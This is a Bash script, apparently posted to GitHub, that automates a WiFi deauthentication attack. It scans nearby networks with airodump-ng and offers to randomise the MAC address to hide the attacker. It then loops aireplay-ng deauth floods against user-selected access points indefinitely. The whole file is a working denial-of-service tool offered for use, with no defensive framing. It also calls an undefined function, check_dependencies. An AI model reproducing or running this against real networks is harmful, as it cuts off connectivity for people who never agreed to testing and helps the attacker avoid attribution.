#!/bin/bash

# -------------------
# Configuration Section
# -------------------
DEBUG_MODE=false  # Set to true to see detailed output
INTERFACE=""
ORIGINAL_MAC=""
ORIGINAL_IFACE=""
SCAN_TIME=30      
DEAUTH_STRENGTH=100 
ATTACK_DELAY=1 #change for crowded areas

# -------------------
# Function Definitions
# -------------------

# Cleanup and exit handler
cleanup() {
    echo -e "\n\n[+] Exiting..."
    echo "[+] Stopping all background processes..."
    pkill -9 aireplay-ng &> /dev/null
    pkill -9 airodump-ng &> /dev/null

    if [ -n "$INTERFACE" ]; then
        echo "[+] Disabling monitor mode on $INTERFACE..."
        airmon-ng stop "$INTERFACE" &> /dev/null
    fi

    if [ -n "$ORIGINAL_MAC" ] && [ -n "$ORIGINAL_IFACE" ]; then
        echo "[+] Restoring original MAC address..."
        ifconfig "$ORIGINAL_IFACE" down
        macchanger --mac="$ORIGINAL_MAC" "$ORIGINAL_IFACE" &> /dev/null
        ifconfig "$ORIGINAL_IFACE" up
    fi

    echo "[+] Restarting NetworkManager..."
    systemctl restart NetworkManager &> /dev/null

    rm -f /tmp/aireplay_pid_*.txt
    rm -f scan_results-*.csv
    exit 0
}

# Check root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "[!] This script must be run as root. Use sudo."
        exit 1
    fi
}

# Validate wireless interface
select_interface() {
    echo "[*] Available wireless interfaces:"
    INTERFACES=$(iw dev | awk '$1=="Interface"{print $2}')
    
    if [ -z "$INTERFACES" ]; then
        echo "[!] No wireless interfaces found. Exiting."
        exit 1
    fi

    index=1
    declare -A INTERFACE_MAP
    for iface in $INTERFACES; do
        INTERFACE_MAP[$index]="$iface"
        echo "[$index] $iface"
        ((index++))
    done

    read -p "Select interface (number): " IFACE_INDEX
    INTERFACE=${INTERFACE_MAP[$IFACE_INDEX]}
    
    if [ -z "$INTERFACE" ]; then
        echo "[!] Invalid selection. Exiting."
        exit 1
    fi
}

# Handle MAC address spoofing
spoof_mac() {
    ORIGINAL_IFACE=$INTERFACE
    echo "[+] Saving original MAC address..."
    ORIGINAL_MAC=$(macchanger -s "$INTERFACE" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
    
    echo "[+] Changing MAC address..."
    ifconfig "$INTERFACE" down
    macchanger -r "$INTERFACE" &> /dev/null
    ifconfig "$INTERFACE" up
    
    NEW_MAC=$(macchanger -s "$INTERFACE" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
    echo "[+] MAC changed from $ORIGINAL_MAC to $NEW_MAC"
}

# Enable monitor mode
enable_monitor_mode() {
    echo "[*] Enabling monitor mode on $INTERFACE..."
    airmon-ng check kill &> /dev/null
    airmon-ng start "$INTERFACE" &> /dev/null
    
    # Verify monitor mode
    sleep 2
    local new_iface=$(airmon-ng | grep "$INTERFACE" | awk '{print $2}')
    if [[ "$new_iface" == *"mon"* ]]; then
        INTERFACE="$new_iface"
        echo "[+] Monitor mode enabled on $INTERFACE"
    else
        echo "[!] Failed to enable monitor mode"
        exit 1
    fi
}

# Scan for networks
scan_networks() {
    echo "[*] Scanning for WiFi networks for $SCAN_TIME seconds..."
    xterm -e "airodump-ng --write scan_results --output-format csv -t WEP,WPA,OPN $INTERFACE --band abg" &
    SCAN_PID=$!
    sleep $SCAN_TIME
    kill $SCAN_PID &> /dev/null
    wait $SCAN_PID 2>/dev/null
}

# Parse scan results
parse_results() {
    echo "[*] Parsing scan results..."
    # Extract AP entries (before "Station MAC" line)
    awk -F ', *' '/Station MAC/{exit} /^[^ ]/{print}' scan_results-01.csv | awk -F ', *' '
    {
        if ($1 ~ /^BSSID/ || $1 == "" || $4 == "-1") next
        bssid = $1
        gsub(/"/, "", bssid)
        gsub(/^ +| +$/, "", bssid)
        essid = $14
        channel = $4
        privacy = $6
        power = $9
        
        gsub(/^ +| +$/, "", essid)
        gsub(/"/, "", privacy)
        
        if (essid == "" || bssid == "") next
        
        printf "%s|%s|%s|%s|%s\n", power, essid, bssid, channel, privacy
    }' | sort -nr | awk -F '|' '
    BEGIN {
        printf "%2s | %-25s | %-17s | %-3s | %-10s\n", "SN", "ESSID", "BSSID", "Chan", "Security"
        print "---------------------------------------------------------------"
    }
    {
        printf "%2d | %-25s | %-17s | %-3s | %-10s\n", 
            NR, $2, $3, $4, $5
    }' > networks.txt
}

# Select target networks
select_targets() {
    echo "[*] Available networks:"
    cat networks.txt
    
    read -p "Enter target numbers (comma-separated): " TARGET_ROWS
    IFS=',' read -ra ROWS <<< "$TARGET_ROWS"
    
    for row in "${ROWS[@]}"; do
        ADJUSTED_ROW=$((row + 2)) 
        
        LINE=$(sed -n "${ADJUSTED_ROW}p" networks.txt)
        if [[ -z "$LINE" ]]; then
            echo "[!] Invalid row: $row"
            continue
        fi
        
        BSSID=$(echo "$LINE" | awk '{print $5}')
        CHANNEL=$(echo "$LINE" | awk '{print $7}')
        ESSID=$(echo "$LINE" | awk '{print $3}')
        
        if [[ -n "$BSSID" && -n "$CHANNEL" && -n "$ESSID" ]]; then
            TARGET_NETWORKS+=("$BSSID,$CHANNEL,$ESSID")
        else
            echo "[!] Failed to parse network details for row: $row"
        fi
    done
    
    if [[ ${#TARGET_NETWORKS[@]} -eq 0 ]]; then
        echo "[!] No valid targets selected. Exiting."
        exit 1
    fi
}

# Perform deauthentication attack
deauth_attack() {
    local bssid=$1
    local channel=$2
    local essid=$3
    
    echo "[+] Attacking: $essid (BSSID: $bssid) on channel $channel"
    
    iw dev "$INTERFACE" set channel "$channel" HT20 &> /dev/null || {
        echo "[!] Failed to set channel $channel. Skipping..."
        return
    }
    

    aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
    AIREPLAY_PID=$!
    echo $AIREPLAY_PID > /tmp/aireplay_pid_$$.txt
    
    # Monitor progress
    for ((i=1; i<=ATTACK_DELAY; i++)); do
        echo -ne "\r[+] Sending $DEAUTH_STRENGTH deauth packets... ($i/$ATTACK_DELAY sec)"
        sleep 1
    done
    echo ""
    
    # Cleanup
    kill $AIREPLAY_PID &> /dev/null
    rm -f /tmp/aireplay_pid_$$.txt
}

# Main attack loop
attack_loop() {
    while true; do
        for target in "${TARGET_NETWORKS[@]}"; do
            IFS=',' read -r bssid channel essid <<< "$target"
            echo "[+] Switching to $essid (Channel $channel)"
            deauth_attack "$bssid" "$channel" "$essid"
        done
        echo "[+] Cycle complete. Restarting attacks..."
    done
}

# -------------------
# Main Execution
# -------------------

# Register cleanup handler
trap cleanup SIGINT

check_root
check_dependencies
select_interface

# Check current mode
MODE=$(iw dev "$INTERFACE" info | grep "type" | awk '{print $2}')
if [ "$MODE" != "monitor" ]; then
    read -p "[?] Spoof MAC address? (y/n): " SPOOF
    if [[ "$SPOOF" =~ ^[Yy]$ ]]; then
        spoof_mac
    fi
    enable_monitor_mode
fi

scan_networks
parse_results
select_targets

echo "[+] Starting attack loop. Press Ctrl+C to stop."
attack_loop


#https://github.com/RMNO21